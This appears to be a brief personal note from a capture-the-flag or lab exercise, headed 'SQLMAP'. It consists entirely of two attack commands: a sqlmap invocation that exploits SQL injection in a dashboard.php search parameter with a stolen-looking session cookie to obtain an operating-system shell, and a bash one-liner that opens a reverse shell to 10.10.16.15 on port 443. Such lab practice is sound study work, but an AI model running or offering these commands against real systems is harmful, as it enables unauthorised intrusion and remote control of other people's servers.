# SQLMAP

```
sqlmap -u 'http://10.129.95.174/dashboard.php?search=her' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
bash -c "bash -i >& /dev/tcp/10.10.16.15/443 0>&1"
```
